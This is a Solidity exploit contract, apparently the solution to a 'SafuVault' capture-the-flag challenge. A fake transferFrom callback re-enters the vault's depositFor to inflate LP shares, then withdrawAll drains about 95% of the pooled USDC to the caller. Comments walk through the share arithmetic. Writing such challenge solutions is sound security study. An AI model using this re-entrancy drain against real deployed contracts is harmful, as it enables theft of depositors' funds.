pragma solidity ^0.8.0;

import "../safu-vault/SafuVault.sol";
import "forge-std/console.sol";


contract SolveSafuVault {

  SafuVault v;
  ERC20 usdc;
  uint256 calls;

  constructor(SafuVault _v, ERC20 _usdc) {
    v =_v;
    usdc = _usdc;
  }

  // Re-entrancy callback, we load up the initial call plus 3 re entrant callbacks
  // Then 1 legitimate call.
  // and on the last one we actually transfer value so then the `_amount`
  // variable is calculated as 20_000 - 10_000 but 10 times 
  // then when calculating the shares, each iteration increases the totalSupply()
  // but _amount / _pool is always = 1.
  // So we get 10,000 LP -> initial call
  // Then 20,000 LP -> re entrant
  // Then 40,000 LP -> re entrant
  // Then 80,000 LP  -> re entrant
  // Then 160,000 LP -> final "legitamate" call

  // Leaving us with 210,000 LP 
  // Then we can call the withdrawAll() function which will withdraw according
  // to our percentage ownership of the shares which is 210,000/220,000 because
  // the other user has 10,000 shares. So 95.45% of 20,000 USDC. Which is 
  // 19,090 USDC!

  // More re-entrancy = higher percentage
  
  function transferFrom(address, address, uint256) external  {
    calls++;
    if (calls < 4) {
      v.depositFor(address(this), 0, address(this));
    } else {
      v.depositFor(address(usdc), usdc.balanceOf(address(this)), address(this));
    }
    
  }

  function solve() external {
    uint256 bal = usdc.balanceOf(address(this));
    bool success = usdc.approve(address(v), bal);
    require(success, "approval broke");

    // Start re-entrancy
    v.depositFor(address(this), 0, address(this));
    // Withdraw all funds
    v.withdrawAll();
    // transfer back to EOA
    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));

  }
}